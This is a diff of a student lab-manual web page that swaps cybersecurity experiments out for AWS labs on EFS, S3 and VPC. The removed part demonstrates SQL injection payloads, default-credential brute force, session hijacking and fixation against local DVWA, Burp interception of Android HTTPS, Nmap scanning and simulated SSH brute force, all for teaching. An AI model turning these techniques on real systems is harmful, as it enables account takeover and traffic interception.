+          <li class="step"><span class="step-n">06</span><span class="step-text">Click <strong>Attach</strong> on the EFS page &rarr; copy the <strong>NFS client mount command</strong>.</span></li>
         </ul>
       </div>
 
       <div class="section">
-        <div class="section-label">Viva Questions</div>
-        <div class="qa-item"><span class="qa-q">Q1</span><span class="qa-a">What is SQL Injection? — Inserting malicious SQL into input fields to manipulate database queries.</span></div>
-        <div class="qa-item"><span class="qa-q">Q2</span><span class="qa-a">Why does <code>1' OR '1'='1</code> work? — It makes the WHERE condition always TRUE, returning all rows.</span></div>
-        <div class="qa-item"><span class="qa-q">Q3</span><span class="qa-a">Difference between UNION-based and Error-based SQLi? — UNION appends extra query results; Error-based extracts data through DB error messages.</span></div>
-        <div class="qa-item"><span class="qa-q">Q4</span><span class="qa-a">What is <code>information_schema</code>? — A built-in MySQL metadata database containing info about all tables, columns, and databases.</span></div>
-        <div class="qa-item"><span class="qa-q">Q5</span><span class="qa-a">How to prevent SQL Injection? — Use prepared statements / parameterized queries with input validation.</span></div>
+        <div class="label">Mount on Instance 1 and Create File</div>
+        <div class="code-header"><span class="code-label">SSH &mdash; Instance 1 (efslab-1)</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># Paste the NFS client command (change directory name at the end)</span>
+<span class="cm"># Example:</span>
+sudo mount -t nfs4 -o nfsvers=4.1 fs-xxxxxxxx.efs.us-east-1.amazonaws.com:/ efslab
+
+<span class="cm"># Navigate to the mounted directory</span>
+<span class="cmd">cd efslab</span>
+
+<span class="cm"># Create a file</span>
+<span class="cmd">touch file.txt</span>
+
+<span class="cm"># Add content to the file</span>
+<span class="cmd">echo "Shared via EFS" > file.txt</span></pre></div>
       </div>
 
       <div class="section">
-        <div class="section-label">Result</div>
+        <div class="label">Verify from Instance 2</div>
+        <div class="code-header"><span class="code-label">SSH &mdash; Instance 2 (efslab-2)</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># Paste the same NFS client mount command (change directory name)</span>
+sudo mount -t nfs4 -o nfsvers=4.1 fs-xxxxxxxx.efs.us-east-1.amazonaws.com:/ efslab
+
+<span class="cm"># Navigate to directory</span>
+<span class="cmd">cd efslab</span>
+
+<span class="cm"># List files (file.txt from Instance 1 appears)</span>
+<span class="cmd">ls</span>
+
+<span class="cm"># Display file content</span>
+<span class="cmd">cat file.txt</span></pre></div>
+        <div class="output">
+          <div class="output-line">file.txt</div>
+          <div class="output-line">Shared via EFS</div>
+          <div class="output-line note">File created on Instance 1 is accessible from Instance 2 via EFS</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
         <div class="conclusion">
-          <p class="conclusion-text">SQL Injection was successfully performed — demonstrating authentication bypass, unauthorized data access, and full database enumeration. This proves that unsanitized user input is a critical vulnerability requiring mandatory security controls.</p>
+          <p>EFS was configured and mounted on two EC2 instances in different Availability Zones. A file created on Instance 1 was immediately accessible from Instance 2, demonstrating EFS as a shared, elastic NFS file system across multiple instances.</p>
         </div>
       </div>
 
     </div>
   </div>
 
-  <!-- EXP 7 — Auth Weaknesses & Session Management -->
-  <div class="experiment" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp07">07</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Authentication Weaknesses &amp; Session Management</div>
-        <div class="exp-subtitle">Brute Force · Session Hijacking · Session Fixation · Improper Logout</div>
+  <!-- WEEK 4 -->
+  <div class="week" id="w4" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W04</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Simple Storage Service (S3) &mdash; Buckets, ACLs, Versioning, Replication</div>
+        <div class="week-sub">S3 &middot; ACL &middot; Bucket Versioning &middot; Cross-Region Replication</div>
       </div>
-      <div class="exp-toggle">▾</div>
+      <div class="week-arrow">&#9662;</div>
     </div>
-    <div class="exp-body">
+    <div class="week-body">
 
       <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Identify and analyze authentication weaknesses and session management vulnerabilities in DVWA — covering brute force attacks, session hijacking, session fixation, and improper logout behavior.</p>
+        <div class="label">Objective</div>
+        <p>Create an S3 bucket, configure public access via ACLs, enable versioning, and set up cross-region object replication.</p>
       </div>
 
       <div class="section">
-        <div class="section-label">Theory</div>
+        <div class="label">Part A &mdash; Create Bucket and Upload Object</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">Auth</span><span class="step-text"><strong>Authentication Weakness</strong> — caused by weak passwords, no account lockout, brute force vulnerability, default credentials.</span></li>
-          <li class="step"><span class="step-num">Sess</span><span class="step-text"><strong>Session Management</strong> — improper handling leads to session hijacking, session fixation, reuse of old session IDs, insecure cookies.</span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Search for <strong>S3</strong> in the AWS Console &rarr; click <strong>Create bucket</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Provide a unique bucket name. Keep bucket type as <strong>General Purpose</strong>. Leave ACLs disabled and public access blocked by default. Click <strong>Create bucket</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Click on the bucket name &rarr; <strong>Upload &rarr; Add files</strong>. Select a file from your PC &rarr; click <strong>Upload</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Click on the uploaded object &rarr; copy the <strong>Object URL</strong>. Open it in a browser &mdash; access is denied (public access is still blocked).</span></li>
         </ul>
       </div>
 
       <div class="section">
-        <div class="section-label">Part A — Launch DVWA</div>
-        <div class="code-block"><pre><span class="cm"># Start Apache and MySQL</span>
-sudo service apache2 start
-sudo service mysql start</pre></div>
+        <div class="label">Part A &mdash; Enable Public Access via ACL</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Open Firefox → <code>http://127.0.0.1/dvwa</code></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Login: <code>admin</code> / <code>password</code></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Go to <strong>DVWA Security</strong> → select <strong>LOW</strong> → Submit</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">Go to bucket &rarr; <strong>Permissions &rarr; Block Public Access &rarr; Edit</strong>. Uncheck all &rarr; <strong>Save changes</strong>.</span></li>
+          <li class="step"><span class="step-n">06</span><span class="step-text">Go to <strong>Object Ownership &rarr; Edit</strong>. Select <strong>ACLs Enabled</strong> &rarr; <strong>Save changes</strong>.</span></li>
+          <li class="step"><span class="step-n">07</span><span class="step-text">Go to <strong>Access Control List &rarr; Edit</strong>. Under <strong>Everyone (public access)</strong>, enable <strong>List objects</strong> and <strong>Read objects</strong>. Save.</span></li>
+          <li class="step"><span class="step-n">08</span><span class="step-text">Click on the uploaded image &rarr; <strong>Object Permissions &rarr; ACL &rarr; Edit</strong>. Enable <strong>Read</strong> for public access &rarr; Save.</span></li>
+          <li class="step"><span class="step-n">09</span><span class="step-text">Copy the <strong>Object URL</strong> &rarr; paste in browser. The image is now publicly accessible.</span></li>
         </ul>
       </div>
 
       <div class="section">
-        <div class="section-label">Part B — Exp 1: Weak Password Authentication</div>
+        <div class="label">Part B &mdash; Enable Versioning</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Navigate: DVWA → Vulnerabilities → <strong>Brute Force</strong></span></li>
-          <li class="step"><span class="step-num">→</span><span class="step-text">Enter Username: <code>admin</code> / Password: <code>password</code> → click Login</span></li>
-          <li class="step"><span class="step-num">✔</span><span class="step-text">Login succeeds with default credential — proves <strong>weak authentication</strong>.</span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to bucket &rarr; <strong>Properties &rarr; Bucket Versioning &rarr; Edit</strong>. Enable versioning &rarr; <strong>Save changes</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Upload the same file again. Toggle <strong>Show versions</strong> to see both versions listed.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Deleting an object adds a <strong>delete marker</strong> &mdash; the object is still present when versions are visible. To permanently delete, select all versions including the delete marker and delete them.</span></li>
         </ul>
       </div>
 
       <div class="section">
-        <div class="section-label">Part B — Exp 2: Manual Brute Force Attack</div>
+        <div class="label">Part C &mdash; Cross-Region Replication</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">→</span><span class="step-text">Keep Username: <code>admin</code> (same every time). Try passwords one by one:</span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Create a source bucket in <strong>N. Virginia</strong>. Enable versioning on it.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Create a destination bucket in <strong>Oregon</strong>. Enable ACLs and versioning.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">On the source bucket &rarr; <strong>Management &rarr; Create Replication Rule</strong>. Set scope to <strong>All objects</strong>. Select the Oregon bucket as destination. Choose <strong>LabRole</strong> as IAM role &rarr; <strong>Save</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Upload any document to the source bucket. The same document automatically appears in the Oregon destination bucket.</span></li>
         </ul>
-        <div class="code-block"><pre><span class="cm"># Attempt 1 — fails</span>
-Username: admin   Password: admin
-
-<span class="cm"># Attempt 2 — fails</span>
-Username: admin   Password: 123456
-
-<span class="cm"># Attempt 3 — SUCCESS ✔</span>
-Username: admin   Password: password</pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ LOGIN SUCCESSFUL — DVWA did NOT block, did NOT lock, allowed unlimited attempts</div>
-          <div class="output-line inp">This is called: Brute Force Vulnerability</div>
+        <div class="output">
+          <div class="output-line">Object uploaded to N. Virginia appears automatically in Oregon bucket</div>
         </div>
       </div>
 
       <div class="section">
-        <div class="section-label">Part C — Exp 3: Session ID Analysis</div>
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>S3 was explored in depth: bucket creation, public access via ACLs, object-level permissions, versioning with delete markers, and cross-region replication. These features cover the core S3 capabilities needed for scalable, redundant object storage.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 5 -->
+  <div class="week" id="w5" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W05</div>
+      <div class="week-title-wrap">
+        <div class="week-title">VPC Creation and EC2 Instance Connectivity</div>
+        <div class="week-sub">VPC &middot; Subnets &middot; Route Tables &middot; Internet Gateway &middot; Security Groups</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Create a custom VPC with public and private subnets, configure route tables and an Internet Gateway, then launch EC2 instances with proper network connectivity.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 1 &mdash; Create VPC and Subnets</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">01</span><span class="step-text">Login to DVWA, then right-click → <strong>Inspect</strong> → <strong>Storage</strong> → <strong>Cookies</strong></span></li>
-          <li class="step"><span class="step-num">02</span><span class="step-text">Select <code>http://127.0.0.1</code> — look for <code>PHPSESSID</code></span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to <strong>AWS Console &rarr; VPC &rarr; Create VPC</strong>. Provide a CIDR block (e.g., <code>10.0.0.0/16</code>).</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Create a <strong>Public Subnet</strong> (e.g., <code>10.0.1.0/24</code>) and a <strong>Private Subnet</strong> (e.g., <code>10.0.2.0/24</code>) within the VPC.</span></li>
         </ul>
-        <div class="output-block">
-          <div class="output-line">PHPSESSID = 5f6194766020dcaa2c906358cbd2941b</div>
-          <div class="output-line inp">⚠ Session ID is visible, unencrypted, and transmitted over HTTP</div>
-        </div>
       </div>
 
       <div class="section">
-        <div class="section-label">Part C — Exp 4: Session Hijacking</div>
-        <div class="code-block"><pre><span class="cm">--- VICTIM BROWSER (Firefox normal window) ---</span>
-<span class="cm"># Step 1: Login to DVWA as admin, stay logged in</span>
-http://127.0.0.1/dvwa  →  admin / password
-
-<span class="cm"># Step 2: Copy PHPSESSID from cookies</span>
-Right-click → Inspect → Storage → Cookies → copy PHPSESSID value
-
-<span class="cm">--- ATTACKER BROWSER (Private Window: Ctrl+Shift+P) ---</span>
-<span class="cm"># Step 3: Open private window, go to DVWA (do NOT login)</span>
-http://127.0.0.1/dvwa
-
-<span class="cm"># Step 4: Paste copied PHPSESSID into attacker's cookie storage</span>
-Inspect → Storage → Cookies → Replace PHPSESSID value → Enter
-
-<span class="cm"># Step 5: Refresh the page (F5)</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ Attacker is now logged in as admin WITHOUT any username or password</div>
-          <div class="output-line inp">Result: Session Hijacking successful</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Part C — Exp 5: Session Fixation</div>
-        <div class="code-block"><pre><span class="cm"># Step 1: Open DVWA login page WITHOUT logging in</span>
-http://127.0.0.1/dvwa/
-
-<span class="cm"># Step 2: Note PHPSESSID BEFORE login</span>
-Inspect → Storage → Cookies
-PHPSESSID (before) = 5f6194766020dcaa2c906358cbd2941b
-
-<span class="cm"># Step 3: Login with same browser window (do NOT close)</span>
-Username: admin  Password: password  → Login
-
-<span class="cm"># Step 4: Check PHPSESSID AFTER login</span>
-Inspect → Storage → Cookies → look at PHPSESSID</pre></div>
-        <div class="output-block">
-          <div class="output-line">CASE 1 — VULNERABLE (DVWA LOW):</div>
-          <div class="output-line">  Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b</div>
-          <div class="output-line">  After  Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b  ← SAME!</div>
-          <div class="output-line inp">⚠ Session Fixation exists — attacker who knew the pre-login ID now has the session</div>
-          <br>
-          <div class="output-line">CASE 2 — SECURE (DVWA HIGH/IMPOSSIBLE):</div>
-          <div class="output-line">  After Login PHPSESSID = be2d584526b42fef6742d5cf95ce008f  ← CHANGED</div>
-          <div class="output-line inp">✔ Session regenerated on login — no fixation possible</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Part C — Exp 6: Improper Logout (Session Reuse)</div>
-        <div class="code-block"><pre><span class="cm"># Step 1: Login normally</span>
-http://127.0.0.1/dvwa/  →  admin / password
-
-<span class="cm"># Step 2: Copy PHPSESSID BEFORE logout</span>
-Inspect → Storage → Cookies → copy PHPSESSID
-Example: be2d584526b42fef6742d5cf95ce008f
-
-<span class="cm"># Step 3: Logout from DVWA</span>
-Click Logout → login page appears
-
-<span class="cm"># Step 4: Open Private Window (Ctrl+Shift+P)</span>
-<span class="cm"># Paste OLD PHPSESSID into cookies, then go to:</span>
-http://127.0.0.1/dvwa/index.php</pre></div>
-        <div class="output-block">
-          <div class="output-line">✔ Still logged in as admin using old session ID</div>
-          <div class="output-line inp">⚠ Logout did NOT destroy the server-side session — Improper Logout vulnerability</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Observations &amp; Results Summary</div>
-        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Weak Password Login → <strong>Successful</strong> with default credentials</span></div>
-        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Brute Force Attack → <strong>Allowed</strong> — no lockout, no delay, unlimited attempts</span></div>
-        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Session ID Exposure → <strong>Found</strong> — plaintext, visible in browser DevTools</span></div>
-        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Session Hijacking → <strong>Possible</strong> — reusing stolen PHPSESSID grants full access</span></div>
-        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Session Fixation → <strong>Observed</strong> — session ID unchanged after login on Low level</span></div>
-        <div class="qa-item"><span class="qa-q">Test</span><span class="qa-a">Improper Logout → <strong>Observed</strong> — old session ID works after logout</span></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Viva Questions</div>
-        <div class="qa-item"><span class="qa-q">Q1</span><span class="qa-a">What is authentication? — Process of verifying identity before granting access.</span></div>
-        <div class="qa-item"><span class="qa-q">Q2</span><span class="qa-a">What is brute force attack? — Systematically trying all possible passwords until the correct one is found.</span></div>
-        <div class="qa-item"><span class="qa-q">Q3</span><span class="qa-a">What is session hijacking? — Stealing a valid session ID and using it to impersonate the victim.</span></div>
-        <div class="qa-item"><span class="qa-q">Q4</span><span class="qa-a">What is session fixation? — Attacker forces a known session ID; victim logs in with it, giving attacker access.</span></div>
-        <div class="qa-item"><span class="qa-q">Q5</span><span class="qa-a">How to prevent session attacks? — Use HTTPS, regenerate session ID on login, set HttpOnly &amp; Secure cookie flags, implement proper logout that destroys server session.</span></div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Conclusion</div>
-        <div class="conclusion">
-          <p class="conclusion-text">Authentication and session management vulnerabilities were successfully identified in DVWA. The experiment demonstrates why secure authentication (rate limiting, lockout, strong passwords) and proper session handling (regeneration, secure cookies, server-side invalidation on logout) are mandatory for web application security.</p>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-
-  <!-- EXP 08 -->
-  <div class="experiment" id="exp08" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number">08</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Mobile Security &mdash; Android Traffic Interception</div>
-        <div class="exp-subtitle">Android Studio &middot; Burp Suite &middot; ADB &middot; Windows CMD</div>
-      </div>
-      <div class="exp-toggle">&#9662;</div>
-    </div>
-    <div class="exp-body">
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Intercept HTTP and HTTPS traffic from an Android emulator using Burp Suite as a proxy &mdash; demonstrating how mobile app communications can be monitored.</p>
-      </div>
-      <div class="section">
-        <div class="section-label">Requirements</div>
-        <div class="tools">
-          <span class="tool-pill">Android Studio Emulator</span>
-          <span class="tool-pill">Burp Suite</span>
-          <span class="tool-pill">ADB platform-tools</span>
-          <span class="tool-pill">Windows CMD</span>
-        </div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 1 &mdash; Navigate to Emulator Folder</div>
-        <div class="cb-wrap"><span class="cb-label">Windows CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 2 &mdash; List Available Virtual Devices</div>
-        <div class="cb-wrap"><span class="cb-label">CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>emulator -list-avds
-<span class="cm"># Output: Pixel_9  (or Pixel_2 etc.)</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 3 &mdash; Start Emulator with Burp Proxy</div>
-        <div class="cb-wrap"><span class="cb-label">CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080
-<span class="cm"># 10.0.2.2 = how Android emulator reaches the Windows host</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 4 &mdash; Configure Burp Suite (GUI)</div>
-        <div class="code-block"><pre>Proxy -&gt; Proxy Settings -&gt; Proxy Listeners -&gt; Edit
--&gt; Binding tab -&gt; All interfaces -&gt; OK
--&gt; Intercept ON</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 5 &mdash; Set Proxy via ADB</div>
-        <div class="cb-wrap"><span class="cb-label">New CMD Window</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
-
-adb devices
-<span class="cm"># Output: emulator-5554  device</span>
-
-adb shell settings put global http_proxy 10.0.2.2:8080
-
-<span class="cm"># Verify:</span>
-adb shell settings get global http_proxy
-<span class="cm"># Output: 10.0.2.2:8080</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 6 &mdash; Test HTTP &amp; HTTPS Interception</div>
-        <div class="code-block"><pre><span class="cm"># In Android emulator Chrome: visit http://example.com</span>
-<span class="cm"># Burp: Proxy -&gt; HTTP History -&gt; request appears</span>
-
-<span class="cm"># For HTTPS: export Burp CA cert</span>
-Burp -&gt; Proxy -&gt; Proxy Settings -&gt; Import/Export CA Certificate
--&gt; DER format -&gt; Save as burpcer.der
-
-<span class="cm"># Push cert to emulator:</span>
-adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
-
-<span class="cm"># Install cert in emulator:</span>
-Settings -&gt; Security &amp; Privacy -&gt; Encryption &amp; Credentials
--&gt; Install a Certificate -&gt; CA Certificate -&gt; burpcer.der
-
-<span class="cm"># Now visit https://example.com -&gt; HTTPS traffic captured!</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Result</div>
-        <div class="conclusion">
-          <p class="conclusion-text">Android application network traffic was successfully intercepted using Burp Suite. By configuring ADB proxy settings and installing the Burp CA certificate, both HTTP and HTTPS traffic from the emulator were captured and analyzed.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- EXP 09 -->
-  <div class="experiment" id="exp09" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number">09</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">IoT Device Security &mdash; Default Passwords &amp; Open Ports</div>
-        <div class="exp-subtitle">Docker &middot; Nmap &middot; Kali Linux &middot; Browser DevTools</div>
-      </div>
-      <div class="exp-toggle">&#9662;</div>
-    </div>
-    <div class="exp-body">
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Identify open ports, default credentials, and unencrypted communication on a simulated IoT device using Docker and Nmap.</p>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 1 &mdash; Deploy Simulated IoT Device (Windows)</div>
-        <div class="cb-wrap"><span class="cb-label">Windows CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
-<span class="cm"># Open browser: http://localhost:8090</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 2 &mdash; Find Windows IP Address</div>
-        <div class="cb-wrap"><span class="cb-label">Windows CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>ipconfig
-<span class="cm"># Note: IPv4 Address e.g. 192.168.0.148</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 3 &mdash; Scan with Nmap from Kali Linux</div>
-        <div class="cb-wrap"><span class="cb-label">Kali Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>nmap -sV 192.168.0.148
-<span class="cm"># -sV = service version detection</span>
-<span class="cm"># Expected output:</span>
-<span class="cm"># PORT     STATE SERVICE VERSION</span>
-<span class="cm"># 8090/tcp open  http    Node.js (Express)</span>
-<span class="cm"># 135/tcp  open  msrpc   Microsoft Windows RPC</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 4 &mdash; Test Default Credentials</div>
-        <div class="code-block"><pre><span class="cm"># In browser: http://localhost:8090 -&gt; Account -&gt; Login</span>
-Email:    admin@juice-sh.op
-Password: admin123
-<span class="cm"># Successful login = Default password vulnerability confirmed!</span></pre></div>
-        <div class="output-block">
-          <div class="output-line">&#10003; Login successful with default credentials</div>
-          <div class="output-line inp">&#9888; No password change enforced &mdash; critical IoT flaw</div>
-        </div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 5 &mdash; Check Unencrypted Communication</div>
-        <div class="code-block"><pre><span class="cm"># In browser on Juice Shop page:</span>
-Press F12 -&gt; Network tab -&gt; reload page
--&gt; Protocol column shows "http" not "https"
--&gt; All data in plain text = vulnerability!</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Result</div>
-        <div class="conclusion">
-          <p class="conclusion-text">Open ports discovered via Nmap (8090 running Node.js). Default credentials granted full access. Browser DevTools confirmed all traffic is unencrypted HTTP &mdash; three critical IoT vulnerabilities demonstrated in one experiment.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- EXP 10 -->
-  <div class="experiment" id="exp10" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number">10</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Disk Forensics &mdash; dd &amp; Autopsy</div>
-        <div class="exp-subtitle">Kali Linux &middot; dd &middot; mkfs.ext4 &middot; Autopsy &middot; localhost:9999</div>
-      </div>
-      <div class="exp-toggle">&#9662;</div>
-    </div>
-    <div class="exp-body">
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Create a forensic disk image and analyze digital evidence using Autopsy &mdash; the standard digital forensics workflow.</p>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 1 &mdash; Create Evidence File</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>echo "Cybersecurity Lab Evidence" &gt; evidence.txt
-ls</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 2 &mdash; Check Disk Partitions</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>lsblk
-<span class="cm"># Shows: sda, sda1, sda2 etc.</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 3 &mdash; Create 100MB Virtual Disk Image</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>dd if=/dev/zero of=practice_disk.dd bs=1M count=100
-<span class="cm"># if=input(zeros)  of=output file  bs=block size  count=blocks</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 4 &mdash; Format the Disk Image</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>mkfs.ext4 practice_disk.dd</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 5 &mdash; Verify &amp; Launch Autopsy</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>ls -lh practice_disk.dd
-<span class="cm"># Output: 100M practice_disk.dd</span>
-
-autopsy
-<span class="cm"># Open Firefox: http://localhost:9999/autopsy</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 6 &mdash; Create Case &amp; Add Image (Autopsy GUI)</div>
-        <div class="code-block"><pre><span class="cm"># Create New Case:</span>
-Case Name: CyberLabCase
-Investigator: (your name)
--&gt; New Case -&gt; OK
-
-<span class="cm"># Add Host:</span>
-Host Name: KaliLabMachine -&gt; Add Host -&gt; OK
-
-<span class="cm"># Add Image:</span>
-Add Image -&gt; Add Image File
--&gt; Browse: /home/kali/practice_disk.dd
--&gt; Import Method: Symlink -&gt; Next</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 7 &mdash; Analyze Evidence</div>
-        <div class="code-block"><pre>Click: File Analysis     -&gt; view all files
-Click: Keyword Search    -&gt; search "evidence"
-Click: File Type         -&gt; filter images, docs
-Click: Deleted Files     -&gt; recoverable deleted files
-Click: Meta Data         -&gt; timestamps (created/modified)</pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Result</div>
-        <div class="conclusion">
-          <p class="conclusion-text">A 100MB forensic disk image was created using <code>dd</code> and formatted using <code>mkfs.ext4</code>. Imported into Autopsy at localhost:9999. File artifacts, metadata, deleted files, and keyword search were examined &mdash; complete digital forensics workflow demonstrated.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- EXP 11 -->
-  <div class="experiment" id="exp11" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number">11</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Log File Analysis for Incident Detection</div>
-        <div class="exp-subtitle">journalctl &middot; grep &middot; awk &middot; sort &middot; uniq &middot; ssh &middot; Kali Linux</div>
-      </div>
-      <div class="exp-toggle">&#9662;</div>
-    </div>
-    <div class="exp-body">
-      <div class="section">
-        <div class="section-label">Aim</div>
-        <p>Analyze system log files and detect suspicious activities such as failed login attempts and brute force attacks using Linux command-line tools.</p>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 1 &mdash; Navigate to Log Directory</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>cd /var/log
-ls
-<span class="cm"># apache2/  -&gt; web server logs</span>
-<span class="cm"># journal/  -&gt; system logs (most important)</span>
-<span class="cm"># wtmp      -&gt; successful logins</span>
-<span class="cm"># btmp      -&gt; failed logins</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 2 &mdash; View Login History</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>last         <span class="cm"># successful logins</span>
-sudo lastb   <span class="cm"># failed logins</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 3 &mdash; Setup SSH Server</div>
-        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>sudo apt install openssh-server -y
-sudo service ssh start
-sudo service ssh status
-<span class="cm"># Should show: active (running)</span></pre></div>
-      </div>
-      <div class="section">
-        <div class="section-label">Step 4 &mdash; Simulate Brute Force</div>
-        <div class="cb-wrap"><span class="cb-label">Run 5-10 times with wrong password</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
-        <div class="code-block"><pre>ssh fakeuser@localhost
